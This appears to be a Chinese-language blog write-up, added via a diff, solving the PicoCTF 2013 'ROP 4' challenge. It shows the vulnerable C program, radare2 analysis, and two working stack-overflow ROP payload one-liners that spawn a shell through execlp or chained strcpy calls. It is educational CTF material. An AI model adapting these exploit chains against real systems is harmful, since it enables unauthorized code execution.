@@ -1,0 +1,156 @@
+---
+layout: post
+title: ROP 4
+categories: writeups
+tags: pwn
+ctfsite: picoctf-2013
+challenge_url: https://github.com/picoCTF/picoCTF-2013-problems/tree/master/ROP%204
+---
+
+这道题是 PicoCTF 2013 ROP 系列的最后一题：
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+
+char exec_string[20];
+
+void exec_the_string() {
+	execlp(exec_string, exec_string, NULL);
+}
+
+void call_me_with_cafebabe(int cafebabe) {
+	if (cafebabe == 0xcafebabe) {
+		strcpy(exec_string, "/sh");
+	}
+}
+
+void call_me_with_two_args(int deadbeef, int cafebabe) {
+	if (cafebabe == 0xcafebabe && deadbeef == 0xdeadbeef) {
+		strcpy(exec_string, "/bin");
+	}
+}
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 512);
+}
+
+void be_nice_to_people() {
+	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
+	// sure we don't drop privs if we exec bash, (ie if we call system()).
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+}
+
+int main(int argc, char** argv) {
+	exec_string[0] = '\0';
+	be_nice_to_people();
+	vulnerable_function();
+}
+```
+
+{% include writeup_begin.html %}
+
+首先 `file` 一下这个程序：
+
+```
+dontpanic@Ubuntu:~$ file rop4
+rop4: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=58db790a742bb1b283bc3301fa309bf5f4e23b27, not stripped
+```
+
+它是静态链接的、非位置无关的可执行文件，因此不会有 ASLR 的问题。`execlp` 的原型如下：
+
+```c
+int execlp(const char *file, const char *arg, ...);
+```
+
+第一个参数是文件路径，第二个参数是 `argv[0]`，也就是程序名称。第二个参数比较随意，我们传入与第一个参数相同的字符串就可以了。这个函数还需要最终传入一个 `NULL` 用来结尾。
+
+下面要解决的就是 "/bin/sh" 应该如何构建。
+
+#### 使用现有的 /bin/sh 字符串
+
+radare2 搜索一下就会发现，我们仍然有现成的 "/bin/sh" 可以利用：
+
+```
+[0x08048df8]> iz | grep bin/sh
+382 0x00083f4f 0x080cbf4f   7   8 (.rodata) ascii /bin/sh 
+```
+
+因此可以直接构造出如下命令进行爆破：
+
+```python
+                                  ↓返回地址（call execlp）          ↓第二个参数（/bin/sh）
+(python -c "print '0'*0x88 + '0000\xed\x8e\x04\x08\x4f\xbf\x0c\x08\x4f\xbf\x0c\x08\x00\x00\x00\x00\n'";cat) | ./rop4
+							 ↑ebp                 ↑第一个参数（/bin/sh）            ↑第三个参数（NULL）
+```
+
+#### 构造出 /bin/sh 字符串
+
+如果没有现成的字符串怎么办呢？也有办法，我们可以自行构造出 “/bin/sh”。首先 `call_me_with_two_args` 中，已经向 `exec_string` 拷贝了 `/bin`；我们下面要做的就是在后面街上 `/sh`，这可以通过调用 `strcpy` 来实现；然后我们就可以直接调用 `exec_the_string` 函数了。
+
+首先看一下 `call_me_with_two_args`：
+
+```asm
+/ (fcn) sym.call_me_with_two_args 45
+|   sym.call_me_with_two_args (int arg_8h, int arg_ch);
+|           ; arg int arg_8h @ ebp+0x8
+|           ; arg int arg_ch @ ebp+0xc
+|           0x08048f0e      55             push ebp
+|           0x08048f0f      89e5           mov ebp, esp
+|           0x08048f11      817d0cbebafe.  cmp dword [arg_ch], 0xcafebabe ; [0xcafebabe:4]=-1
+|       ,=< 0x08048f18      751f           jne 0x8048f39
+|       |   0x08048f1a      817d08efbead.  cmp dword [arg_8h], 0xdeadbeef ; [0xdeadbeef:4]=-1
+|      ,==< 0x08048f21      7516           jne 0x8048f39
+|      ||   0x08048f23      b8cc5e0c08     mov eax, str.bin            ; 0x80c5ecc ; "/bin"
+|      ||   0x08048f28      8b10           mov edx, dword [eax]
+|      ||   0x08048f2a      89152c110f08   mov dword [obj.exec_string], edx ; [0x80f112c:4]=0
+|      ||   0x08048f30      0fb64004       movzx eax, byte [eax + 4]   ; [0x4:1]=255 ; 4
+|      ||   0x08048f34      a230110f08     mov byte [0x80f1130], al    ; [0x80f1130:1]=0
+|      ||      ; JMP XREF from 0x08048f18 (sym.call_me_with_two_args)
+|      ||      ; JMP XREF from 0x08048f21 (sym.call_me_with_two_args)
+|      ``-> 0x08048f39      5d             pop ebp
+\           0x08048f3a      c3             ret
+
+```
+
+溢出后的第一个目标就是跳到 `0x08048f23`，先填充上 “/bin”
+
+```python
+print '0'*0x88 + '0000\x23\x8f\x04\x08'
+                 ↑ebp ↑返回地址
+```
+
+然后向下执行，会 `pop` 一下 `ebp`，这个我们随便填上点东西就可以了；然后 `call_me_with_two_args` 返回，我们需要它返回至 `strcpy`，同时还需要构造 strcpy 的参数：
+
+```python
+                                          ↓call_me_with_two_args pop ebp        ↓strcpy参数1    ↓strcpy参数2
+print '0'*0x88 + '0000\x23\x8f\x04\x08' + '0000\xAA\xAA\xAA\xAA\x??\x??\x??\x??\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC'
+                 ↑ebp ↑返回地址                 ↑strcpy的地址    ↑strcpy的返回地址
+```
+
+首先先来确定 `strcpy` 的地址。在 r2 中查一下符号：
+
+```
+[0x08048df8]> is | grep strcpy
+513 0x000260c0 0x0806e0c0  LOCAL   FUNC  139 __strcpy_ia32
+881 0x00026070 0x0806e070 GLOBAL   LOOS   69 strcpy
+1687 0x0002aa40 0x08072a40 GLOBAL   FUNC 6219 __strcpy_ssse3
+1864 0x00030670 0x08078670 GLOBAL   FUNC 1509 __strcpy_sse2
+```
+
+上面的 `strcpy` 只是一个入口，会根据 CPU 的不同特性**返回**不同实现的地址（而不是继续调用实现函数），因此这个并不是我们想要的。我们可以直接调用 `__strcpy_ia32`。
+
+至于参数，第一个参数自然就是 `exec_string + 4`，第二个参数是 `/sh` 的地址。
+
+在上面的命令中，还有一块 `\x??\x??\x??\x??` 没有确定。这是 `strcpy` 函数的返回地址。这里直接填入 `exec_the_string` 函数的地址即可。因此完整的爆破命令为：
+
+```python
+                                                      ↓call_me_with_two_args pop ebp        ↓strcpy参数1    ↓strcpy参数2
+(python -c "print '0'*0x88 + '0000\x23\x8f\x04\x08' + '0000\xc0\xe0\x06\x08\xd0\x8e\x04\x08\x30\x11\x0f\x08\xc8\x5e\x0c\x08\n'";cat) | ./rop4
+                             ↑ebp ↑返回地址                 ↑strcpy的地址    ↑strcpy的返回地址
+```
+
+{% include writeup_end.html %}
